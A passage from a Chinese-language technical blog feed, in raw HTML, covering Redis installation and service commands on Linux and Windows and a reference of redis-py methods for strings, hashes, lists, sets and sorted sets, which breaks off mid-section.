class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启远程连接</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">bind</span> 127.0.0.1</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置密码</span></span><br><span class="line">requirepass 123456</span><br></pre></td></tr></table></figure><ul><li>测试服务</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本地登录</span></span><br><span class="line">redis-cli</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">远程登录</span></span><br><span class="line">redis-cli -h ip -p port</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">auth验证密码</span></span><br><span class="line">auth passwo</span><br></pre></td></tr></table></figure><ul><li>查看守护进程运行状态</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure><ul><li>卸载</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭守护进程redis</span></span><br><span class="line">sudo service redis stop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载安装的软件包</span></span><br><span class="line">sudo apt-get remove --purge redis-server*</span><br></pre></td></tr></table></figure><h3 id="3、Windows10"><a href="#3、Windows10" class="headerlink" title="3、Windows10"></a>3、Windows10</h3><ul><li>环境变量</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装目录</span></span><br><span class="line">D:\PortableFiles\Redis</span><br></pre></td></tr></table></figure><ul><li>注册服务</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装目录</span></span><br><span class="line">redis-server --service-install redis.windows.conf --loglevel verbose</span><br></pre></td></tr></table></figure><ul><li>操作服务</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">net start redis</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">net stop redis</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No85：Python-Redis使用技巧</title>
      <link href="/posts/1f5b91fa.html"/>
      <url>/posts/1f5b91fa.html</url>
      
        <content type="html"><![CDATA[<p>参考文章<a href="https://www.cnblogs.com/fengting0913/p/13511383.html">python操作Redis详解</a></p><h3 id="1、连接Redis数据库"><a href="#1、连接Redis数据库" class="headerlink" title="1、连接Redis数据库"></a>1、连接Redis数据库</h3><ul><li>直接连接</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    redis://:password@host:port/db(TCP)</span></span><br><span class="line"><span class="string">    rediss://:password@host:port/db(TCP+SSL)</span></span><br><span class="line"><span class="string">    unix://:password@/path/to/socket.sock?db=db(UNIX+socket)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># red = redis.Redis.from_url(&quot;redis://:password@127.0.0.1:6379/0&quot;)</span></span><br><span class="line">red = redis.Redis(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">6379</span>, password=<span class="string">&quot;123456&quot;</span>, db=<span class="number">0</span>, decode_responses=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>连接池连接</li></ul><p>连接池的原理是,通过预先创建多个连接,当进行redis操作时,直接获取已经创建的连接进行操作</p><p>而且操作完成后,不会释放,用于后续的其他redis操作，这样就达到了避免频繁的redis连接创建和释放的目的,从而提高性能。</p><p>redis模块采用ConnectionPool来管理对redis server的所有连接。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">pool = redis.ConnectionPool(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">6379</span>, password=<span class="string">&quot;password&quot;</span>, db=<span class="number">1</span>)</span><br><span class="line">red = redis.Redis(connection_pool=pool, decode_responses=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、常用操作"><a href="#2、常用操作" class="headerlink" title="2、常用操作"></a>2、常用操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">red.delete(*names)</span><br><span class="line"><span class="comment"># 根据删除redis中的任意数据类型</span></span><br><span class="line"></span><br><span class="line">red.exists(name)</span><br><span class="line"><span class="comment"># 检测redis的name是否存在</span></span><br><span class="line"></span><br><span class="line">red.keys(pattern=<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"><span class="comment"># 根据模型获取redis的name</span></span><br><span class="line"></span><br><span class="line">red.expire(name, time)</span><br><span class="line"><span class="comment"># 为某个redis的某个name设置超时时间</span></span><br><span class="line"></span><br><span class="line">red.rename(src, dst)</span><br><span class="line"><span class="comment"># 对redis的name重命名</span></span><br><span class="line"></span><br><span class="line">red.move(name, db)</span><br><span class="line"><span class="comment"># 将redis的某个值移动到指定的db下</span></span><br><span class="line"></span><br><span class="line">red.randomkey()</span><br><span class="line"><span class="comment"># 随机获取一个redis的name（不删除）</span></span><br><span class="line"></span><br><span class="line">red.<span class="built_in">type</span>(name)</span><br><span class="line"><span class="comment"># 获取name对应值的类型</span></span><br><span class="line"></span><br><span class="line">red.flushdb(asynchronous=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 清空当前db中的数据，默认是同步，异步asynchronous=True，会新起一个线程进行清空操作，不阻塞主线程。</span></span><br><span class="line"></span><br><span class="line">red.flushall(asynchronous=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 清空所有db中的数据，默认是同步，异步asynchronous=True，会新起一个线程进行清空操作，不阻塞主线程。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量提交请求pipeline</span></span><br><span class="line"><span class="keyword">with</span> red.pipeline(transaction=<span class="literal">False</span>) <span class="keyword">as</span> p:</span><br><span class="line">    p.sadd(<span class="string">&quot;name&quot;</span>, <span class="number">1</span>)</span><br><span class="line">    p.execute()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、String"><a href="#3、String" class="headerlink" title="3、String"></a>3、String</h3><ul><li><p>string是redis最基本的类型，你可以理解成与Memcached一模一样的类型，一个key对应一个value。</p></li><li><p>string类型是二进制安全的。意思是redis的string可以包含任何数据。比如jpg图片或者序列化的对象。</p></li><li><p>string类型是Redis最基本的数据类型，一个键最大能存储512MB。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">red.<span class="built_in">set</span>(name, value, ex=<span class="literal">None</span>, px=<span class="literal">None</span>, nx=<span class="literal">False</span>, xx=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 在Redis中设置值，默认，不存在则创建，存在则修改</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># ex，过期时间（秒）</span></span><br><span class="line"><span class="comment"># px，过期时间（毫秒）</span></span><br><span class="line"><span class="comment"># nx，如果设置为True，则只有name不存在时，当前set操作才执行</span></span><br><span class="line"><span class="comment"># xx，如果设置为True，则只有name存在时，岗前set操作才执行</span></span><br><span class="line"></span><br><span class="line">red.mset(*args, kwargs)</span><br><span class="line"><span class="comment"># 批量设置值</span></span><br><span class="line"><span class="comment"># 如：</span></span><br><span class="line"><span class="comment"># mset(k1=&#x27;v1&#x27;, k2=&#x27;v2&#x27;)</span></span><br><span class="line"><span class="comment"># mget(&#123;&#x27;k1&#x27;: &#x27;v1&#x27;, &#x27;k2&#x27;: &#x27;v2&#x27;&#125;)</span></span><br><span class="line"></span><br><span class="line">red.setnx(name, value)</span><br><span class="line"><span class="comment"># 设置值，只有name不存在时，执行设置操作（添加）</span></span><br><span class="line"></span><br><span class="line">red.setex(name, value, time)</span><br><span class="line"><span class="comment"># 设置值</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># time，过期时间（数字秒或timedelta对象）</span></span><br><span class="line"></span><br><span class="line">red.psetex(name, time_ms, value)</span><br><span class="line"><span class="comment"># 设置值</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># time_ms，过期时间（数字毫秒或timedelta对象）</span></span><br><span class="line"></span><br><span class="line">red.get(name)</span><br><span class="line"><span class="comment"># 获取值</span></span><br><span class="line"></span><br><span class="line">red.mget(keys, args)</span><br><span class="line"><span class="comment"># 批量获取</span></span><br><span class="line"><span class="comment"># 如：</span></span><br><span class="line"><span class="comment"># mget(&#x27;hi&#x27;,&#x27;aliang&#x27;)</span></span><br><span class="line"><span class="comment"># r.mget([&#x27;hi&#x27;,&#x27;aliang&#x27;])</span></span><br><span class="line"></span><br><span class="line">red.getset(name, value)</span><br><span class="line"><span class="comment"># 设置新值并获取原来的值</span></span><br><span class="line"></span><br><span class="line">red.strlen(name)</span><br><span class="line"><span class="comment"># 返回name对应值的字节长度（一个汉字3个字节）</span></span><br><span class="line"></span><br><span class="line">red.getrange(key, start, end)</span><br><span class="line"><span class="comment"># 获取子序列（根据字节获取，非字符）</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># key，根据键取值的键</span></span><br><span class="line"><span class="comment"># start，起始位置（字节）</span></span><br><span class="line"><span class="comment"># end，结束位置（字节）</span></span><br><span class="line"><span class="comment"># 如：&quot;嗨阿良&quot;，0-3表示&quot;嗨&quot;</span></span><br><span class="line"></span><br><span class="line">red.setrange(name, offset, value)</span><br><span class="line"><span class="comment"># 修改字符串内容，从指定字符串索引开始向后替换（新值太长时，则向后添加）</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># offset，字符串的索引，字节（一个汉字三个字节）</span></span><br><span class="line"><span class="comment"># value，要设置的值</span></span><br><span class="line"></span><br><span class="line">red.setbit(name, offset, value)</span><br><span class="line"><span class="comment"># 对name对应值的二进制表示的位进行操作</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis的name</span></span><br><span class="line"><span class="comment"># offset，位的索引（将值变换成二进制后再进行索引）</span></span><br><span class="line"><span class="comment"># value，值只能是1或0</span></span><br><span class="line"></span><br><span class="line">red.getbit(name, offset)</span><br><span class="line"><span class="comment"># 获取name对应的值的二进制表示中的某位的值（0或1）</span></span><br><span class="line"></span><br><span class="line">red.bitcount(key, start=<span class="literal">None</span>, end=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 获取name对应的值的二进制表示中1的个数</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># key，Redis的name</span></span><br><span class="line"><span class="comment"># start，位起始位置</span></span><br><span class="line"><span class="comment"># end，位结束位置</span></span><br><span class="line"></span><br><span class="line">red.bitop(operation, dest, keys)</span><br><span class="line"><span class="comment"># 获取多个值，并将值做位运算，将最后的结果保存至新的name对应的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># operation,AND（并）、OR（或）、NOT（非）、XOR（异或）</span></span><br><span class="line"><span class="comment"># dest,新的Redis的name</span></span><br><span class="line"><span class="comment"># *keys,要查找的Redis的name</span></span><br><span class="line"></span><br><span class="line">red.incr(<span class="variable language_">self</span>, name, amount=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 自增name对应的值，当name不存在时，则创建name＝amount，否则，则自增。</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name,Redis的name</span></span><br><span class="line"><span class="comment"># amount,自增数（必须是整数）</span></span><br><span class="line"></span><br><span class="line">red.incrbyfloat(<span class="variable language_">self</span>, name, amount=<span class="number">1.0</span>)</span><br><span class="line"><span class="comment"># 自增name对应的值，当name不存在时，则创建name＝amount，否则，则自增。</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name,Redis的name</span></span><br><span class="line"><span class="comment"># amount,自增数（浮点型）</span></span><br><span class="line"></span><br><span class="line">red.decr(<span class="variable language_">self</span>, name, amount=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 自减name对应的值，当name不存在时，则创建name＝amount，否则，则自减。</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name,Redis的name</span></span><br><span class="line"><span class="comment"># amount,自减数（整数）</span></span><br><span class="line"></span><br><span class="line">red.append(key, value)</span><br><span class="line"><span class="comment"># 在redis name对应的值后面追加内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># key,redis的name</span></span><br><span class="line"><span class="comment"># value,要追加的字符串</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4、Hash"><a href="#4、Hash" class="headerlink" title="4、Hash"></a>4、Hash</h3><ul><li><p>Redis hash是一个键值对集合。</p></li><li><p>Redis hash是一个string类型的field和value的映射表，hash特别适合用于存储对象。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">red.hset(name, key, value)</span><br><span class="line"><span class="comment"># name对应的hash中设置一个键值对（不存在，则创建；否则，修改）</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis的name</span></span><br><span class="line"><span class="comment"># key，name对应的hash中的key</span></span><br><span class="line"><span class="comment"># value，name对应的hash中的value</span></span><br><span class="line"><span class="comment"># 注：</span></span><br><span class="line"><span class="comment"># hsetnx(name,key,value),当name对应的hash中不存在当前key时则创建（相当于添加）</span></span><br><span class="line"></span><br><span class="line">red.hmset(name, mapping)</span><br><span class="line"><span class="comment"># 在name对应的hash中批量设置键值对</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis的name</span></span><br><span class="line"><span class="comment"># mapping，字典</span></span><br><span class="line"></span><br><span class="line">red.hget(name, key)</span><br><span class="line"><span class="comment"># 在name对应的hash中获取根据key获取value</span></span><br><span class="line"></span><br><span class="line">red.hmget(name, keys, args)</span><br><span class="line"><span class="comment"># 在name对应的hash中获取多个key的值</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，reids对应的name</span></span><br><span class="line"><span class="comment"># keys，要获取key集合</span></span><br><span class="line"><span class="comment"># *args，要获取的key</span></span><br><span class="line"></span><br><span class="line">red.hgetall(name)</span><br><span class="line"><span class="comment"># 获取name对应hash的所有键值</span></span><br><span class="line"></span><br><span class="line">red.hlen(name)</span><br><span class="line"><span class="comment"># 获取name对应的hash中键值对的个数</span></span><br><span class="line"></span><br><span class="line">red.hkeys(name)</span><br><span class="line"><span class="comment"># 获取name对应的hash中所有的key的值</span></span><br><span class="line"></span><br><span class="line">red.hvals(name)</span><br><span class="line"><span class="comment"># 获取name对应的hash中所有的value的值</span></span><br><span class="line"></span><br><span class="line">red.hexists(name, key)</span><br><span class="line"><span class="comment"># 检查name对应的hash是否存在当前传入的key</span></span><br><span class="line"></span><br><span class="line">red.hdel(name, *keys)</span><br><span class="line"><span class="comment"># 将name对应的hash中指定key的键值对删除</span></span><br><span class="line"></span><br><span class="line">red.hincrby(name, key, amount=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 自增name对应的hash中的指定key的值，不存在则创建key=amount</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis中的name</span></span><br><span class="line"><span class="comment"># key，hash对应的key</span></span><br><span class="line"><span class="comment"># amount，自增数（整数）</span></span><br><span class="line"></span><br><span class="line">red.hincrbyfloat(name, key, amount=<span class="number">1.0</span>)</span><br><span class="line"><span class="comment"># 自增name对应的hash中的指定key的值，不存在则创建key=amount</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis中的name</span></span><br><span class="line"><span class="comment"># key，hash对应的key</span></span><br><span class="line"><span class="comment"># amount，自增数（浮点数）</span></span><br><span class="line"><span class="comment"># 自增name对应的hash中的指定key的值，不存在则创建key=amount</span></span><br><span class="line"></span><br><span class="line">red.hscan(name, cursor=<span class="number">0</span>, <span class="keyword">match</span>=<span class="literal">None</span>, count=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 增量式迭代获取，对于数据大的数据非常有用，hscan可以实现分片的获取数据，并非一次性将数据全部获取完，从而放置内存被撑爆</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis的name</span></span><br><span class="line"><span class="comment"># cursor，游标（基于游标分批取获取数据）</span></span><br><span class="line"><span class="comment"># match，匹配指定key，默认None 表示所有的key</span></span><br><span class="line"><span class="comment"># count，每次分片最少获取个数，默认None表示采用Redis的默认分片个数</span></span><br><span class="line"><span class="comment"># 如：</span></span><br><span class="line"><span class="comment"># 第一次：cursor1, data1 = r.hscan(&#x27;xx&#x27;, cursor=0, match=None, count=None)</span></span><br><span class="line"><span class="comment"># 第二次：cursor2, data1 = r.hscan(&#x27;xx&#x27;, cursor=cursor1, match=None, count=None)</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># 直到返回值cursor的值为0时，表示数据已经通过分片获取完毕</span></span><br><span class="line"></span><br><span class="line">red.hscan_iter(name, <span class="keyword">match</span>=<span class="literal">None</span>, count=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 利用yield封装hscan创建生成器，实现分批去redis中获取数据</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># match，匹配指定key，默认None 表示所有的key</span></span><br><span class="line"><span class="comment"># count，每次分片最少获取个数，默认None表示采用Redis的默认分片个数</span></span><br><span class="line"><span class="comment"># 如：</span></span><br><span class="line"><span class="comment"># for item in r.hscan_iter(&#x27;xx&#x27;):</span></span><br><span class="line"><span class="comment">#     print item</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5、List"><a href="#5、List" class="headerlink" title="5、List"></a>5、List</h3><ul><li>Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素导列表的头部（左边）或者尾部（右边）。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">red.lpush(name, values)</span><br><span class="line"><span class="comment"># 在name对应的list中添加元素，每个新的元素都添加到列表的最左边</span></span><br><span class="line"><span class="comment"># 如：</span></span><br><span class="line"><span class="comment"># r.lpush(&#x27;oo&#x27;, 11,22,33)</span></span><br><span class="line"><span class="comment"># 保存顺序为: 33,22,11</span></span><br><span class="line"><span class="comment"># 扩展：</span></span><br><span class="line"><span class="comment"># rpush(name, values)表示从右向左操作</span></span><br><span class="line"></span><br><span class="line">red.lpushx(name, value)</span><br><span class="line"><span class="comment"># 在name对应的list中添加元素，只有name已经存在时，值添加到列表的最左边</span></span><br><span class="line"><span class="comment"># 扩展：</span></span><br><span class="line"><span class="comment"># rpushx(name, value)表示从右向左操作</span></span><br><span class="line"></span><br><span class="line">red.blpop(keys, timeout)</span><br><span class="line"><span class="comment"># 将多个列表排列，按照从左到右去pop对应列表的元素</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># keys，redis的name的集合</span></span><br><span class="line"><span class="comment"># timeout，超时时间，当元素所有列表的元素获取完之后，阻塞等待列表内有数据的时间（秒）,0表示永远阻塞</span></span><br><span class="line"><span class="comment"># 更多：</span></span><br><span class="line"><span class="comment"># r.brpop(keys, timeout)，从右向左获取数据</span></span><br><span class="line"></span><br><span class="line">red.llen(name)</span><br><span class="line"><span class="comment"># name对应的list元素的个数</span></span><br><span class="line"></span><br><span class="line">red.linsert(name, where, refvalue, value)</span><br><span class="line"><span class="comment"># 在name对应的列表的某一个值前或后插入一个新值</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis的name</span></span><br><span class="line"><span class="comment"># where，BEFORE或AFTER</span></span><br><span class="line"><span class="comment"># refvalue，标杆值，即：在它前后插入数据</span></span><br><span class="line"><span class="comment"># value，要插入的数据</span></span><br><span class="line"></span><br><span class="line">red.lset(name, index, value)</span><br><span class="line"><span class="comment"># 对name对应的list中的某一个索引位置重新赋值</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis的name</span></span><br><span class="line"><span class="comment"># index，list的索引位置</span></span><br><span class="line"><span class="comment"># value，要设置的值</span></span><br><span class="line"></span><br><span class="line">red.lrem(name, value, num)</span><br><span class="line"><span class="comment"># 在name对应的list中删除指定的值</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis的name</span></span><br><span class="line"><span class="comment"># value，要删除的值</span></span><br><span class="line"><span class="comment"># num，num=0，删除列表中所有的指定值；</span></span><br><span class="line"><span class="comment"># num=2,从前到后，删除2个；</span></span><br><span class="line"><span class="comment"># num=-2,从后向前，删除2个</span></span><br><span class="line"></span><br><span class="line">red.lpop(name)</span><br><span class="line"><span class="comment"># 在name对应的列表的左侧获取第一个元素并在列表中移除，返回值则是第一个元素</span></span><br><span class="line"><span class="comment"># 更多：</span></span><br><span class="line"><span class="comment"># rpop(name)表示从右向左操作</span></span><br><span class="line"></span><br><span class="line">red.lindex(name, index)</span><br><span class="line"><span class="comment"># 在name对应的列表中根据索引获取列表元素</span></span><br><span class="line"></span><br><span class="line">red.lrange(name, start, end)</span><br><span class="line"><span class="comment"># 在name对应的列表分片获取数据</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis的name</span></span><br><span class="line"><span class="comment"># start，索引的起始位置</span></span><br><span class="line"><span class="comment"># end，索引结束位置</span></span><br><span class="line"></span><br><span class="line">red.ltrim(name, start, end)</span><br><span class="line"><span class="comment"># 在name对应的列表中移除没有在start-end索引之间的值</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis的name</span></span><br><span class="line"><span class="comment"># start，索引的起始位置</span></span><br><span class="line"><span class="comment"># end，索引结束位置</span></span><br><span class="line"></span><br><span class="line">red.rpoplpush(src, dst)</span><br><span class="line"><span class="comment"># 从一个列表取出最右边的元素，同时将其添加至另一个列表的最左边</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># src，要取数据的列表的name</span></span><br><span class="line"><span class="comment"># dst，要添加数据的列表的name</span></span><br><span class="line"></span><br><span class="line">red.brpoplpush(src, dst, timeout=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从一个列表的右侧移除一个元素并将其添加到另一个列表的左侧</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># src，取出并要移除元素的列表对应的name</span></span><br><span class="line"><span class="comment"># dst，要插入元素的列表对应的name</span></span><br><span class="line"><span class="comment"># timeout，当src对应的列表中没有数据时，阻塞等待其有数据的超时时间（秒），0表示永远阻塞</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义增量迭代</span></span><br><span class="line"><span class="comment"># 由于redis类库中没有提供对列表元素的增量迭代，如果想要循环name对应的列表的所有元素，那么就需要：</span></span><br><span class="line"><span class="comment"># 1、获取name对应的所有列表</span></span><br><span class="line"><span class="comment"># 2、循环列表</span></span><br><span class="line"><span class="comment"># 但是，如果列表非常大，那么就有可能在第一步时就将程序的内容撑爆，所有有必要自定义一个增量迭代的功能：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_iter</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    自定义redis列表增量迭代</span></span><br><span class="line"><span class="string">    :param name: redis中的name，即：迭代name对应的列表</span></span><br><span class="line"><span class="string">    :return: yield 返回 列表元素</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    list_count = r.llen(name)</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> xrange(list_count):</span><br><span class="line">        <span class="keyword">yield</span> r.lindex(name, index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> list_iter(<span class="string">&quot;pp&quot;</span>):</span><br><span class="line">    <span class="built_in">print</span></span><br><span class="line">    item</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6、Set"><a href="#6、Set" class="headerlink" title="6、Set"></a>6、Set</h3><ul><li><p>Redis的Set是string类型的无序集合。</p></li><li><p>集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">red.sadd(name, values)</span><br><span class="line"><span class="comment"># name对应的集合中添加元素</span></span><br><span class="line"></span><br><span class="line">red.scard(name)</span><br><span class="line"><span class="comment"># 获取name对应的集合中元素个数</span></span><br><span class="line"></span><br><span class="line">red.sdiff(keys, args)</span><br><span class="line"><span class="comment"># 在第一个name对应的集合中且不在其他name对应的集合的元素集合</span></span><br><span class="line"></span><br><span class="line">red.sdiffstore(dest, keys, args)</span><br><span class="line"><span class="comment"># 获取第一个name对应的集合中且不在其他name对应的集合，再将其新加入到dest对应的集合中</span></span><br><span class="line"></span><br><span class="line">red.sinter(keys, args)</span><br><span class="line"><span class="comment"># 获取多一个name对应集合的并集</span></span><br><span class="line"></span><br><span class="line">red.sinterstore(dest, keys, args)</span><br><span class="line"><span class="comment"># 获取多一个name对应集合的并集，再讲其加入到dest对应的集合中</span></span><br><span class="line"></span><br><span class="line">red.sismember(name, value)</span><br><span class="line"><span class="comment"># 检查value是否是name对应的集合的成员</span></span><br><span class="line"></span><br><span class="line">red.smembers(name)</span><br><span class="line"><span class="comment"># 获取name对应的集合的所有成员</span></span><br><span class="line"></span><br><span class="line">red.smove(src, dst, value)</span><br><span class="line"><span class="comment"># 将某个成员从一个集合中移动到另外一个集合</span></span><br><span class="line"></span><br><span class="line">red.spop(name)</span><br><span class="line"><span class="comment"># 从集合的右侧（尾部）移除一个成员，并将其返回</span></span><br><span class="line"></span><br><span class="line">red.srandmember(name, numbers)</span><br><span class="line"><span class="comment"># 从name对应的集合中随机获取numbers个元素</span></span><br><span class="line"></span><br><span class="line">red.srem(name, values)</span><br><span class="line"><span class="comment"># 在name对应的集合中删除某些值</span></span><br><span class="line"></span><br><span class="line">red.sunion(keys, args)</span><br><span class="line"><span class="comment"># 获取多一个name对应的集合的并集</span></span><br><span class="line"></span><br><span class="line">red.sunionstore(dest, keys, args)</span><br><span class="line"><span class="comment"># 获取多一个name对应的集合的并集，并将结果保存到dest对应的集合中</span></span><br><span class="line"></span><br><span class="line">sscan(name, cursor=<span class="number">0</span>, <span class="keyword">match</span>=<span class="literal">None</span>, count=<span class="literal">None</span>)</span><br><span class="line">sscan_iter(name, <span class="keyword">match</span>=<span class="literal">None</span>, count=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 同字符串的操作，用于增量迭代分批获取元素，避免内存消耗太大</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="7、Zset"><a href="#7、Zset" class="headerlink" title="7、Zset"></a>7、Zset</h3><ul><li><p>Redis的zset和set一样也是string类型元素的集合,且不允许重复的成员。</p></li><li><p>不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。</p></li><li><p>zset的成员是唯一的,但分数(score)却可以重复。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">red.zadd(name, *args, kwargs)</span><br><span class="line"><span class="comment"># 在name对应的有序集合中添加元素</span></span><br><span class="line"><span class="comment"># 如：</span></span><br><span class="line"><span class="comment"># zadd(&#x27;zz&#x27;, &#x27;n1&#x27;, 1, &#x27;n2&#x27;, 2)</span></span><br><span class="line"><span class="comment"># zadd(&#x27;zz&#x27;, n1=11, n2=22)</span></span><br><span class="line"></span><br><span class="line">red.zcard(name)</span><br><span class="line"><span class="comment"># 获取name对应的有序集合元素的数量</span></span><br><span class="line"></span><br><span class="line">red.zcount(name, <span class="built_in">min</span>, <span class="built_in">max</span>)</span><br><span class="line"><span class="comment"># 获取name对应的有序集合中分数在[min,max]之间的个数</span></span><br><span class="line"></span><br><span class="line">red.zincrby(name, value, amount)</span><br><span class="line"><span class="comment"># 自增name对应的有序集合的name对应的分数</span></span><br><span class="line"></span><br><span class="line">red.zrange(name, start, end, desc=<span class="literal">False</span>, withscores=<span class="literal">False</span>, score_cast_func=<span class="built_in">float</span>)</span><br><span class="line"><span class="comment"># 按照索引范围获取name对应的有序集合的元素</span></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis的name</span></span><br><span class="line"><span class="comment"># start，有序集合索引起始位置（非分数）</span></span><br><span class="line"><span class="comment"># end，有序集合索引结束位置（非分数）</span></span><br><span class="line"><span class="comment"># desc，排序规则，默认按照分数从小到大排序</span></span><br><span class="line"><span class="comment"># withscores，是否获取元素的分数，默认只获取元素的值</span></span><br><span class="line"><span class="comment"># score_cast_func，对分数进行数据转换的函数</span></span><br><span class="line"><span class="comment"># 更多：</span></span><br><span class="line"><span class="comment"># 从大到小排序</span></span><br><span class="line"><span class="comment"># zrevrange(name, start, end, withscores=False, score_cast_func=float)</span></span><br><span class="line"><span class="comment"># 按照分数范围获取name对应的有序集合的元素</span></span><br><span class="line"><span class="comment"># zrangebyscore(name, min, max, start=None, num=None, 